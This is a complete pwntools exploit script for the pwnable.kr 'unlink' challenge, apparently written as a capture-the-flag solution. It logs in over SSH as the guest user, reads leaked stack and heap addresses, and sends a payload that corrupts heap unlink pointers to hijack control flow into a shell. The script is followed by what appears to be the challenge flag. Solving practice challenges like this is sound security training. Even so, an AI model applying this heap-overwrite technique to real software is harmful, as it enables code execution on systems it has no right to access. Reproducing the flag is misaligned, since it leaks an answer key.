from pwn import *

con = ssh("unlink", "pwnable.kr", 2222, "guest")
sh = con.process(executable="/home/unlink/unlink")
stack_leak = int(sh.recvline().split(" ")[-1].strip(), 16)
heap_leak = int(sh.recvline().split(" ")[-1].strip(), 16)
shell = 0x80484eb
sh.sendline(p32(shell) + "\x90" * 12 + p32(heap_leak + 0xc) + p32(stack_leak + 0x10))
sh.interactive()

# conditional_write_what_where_from_unl1nk_explo1t
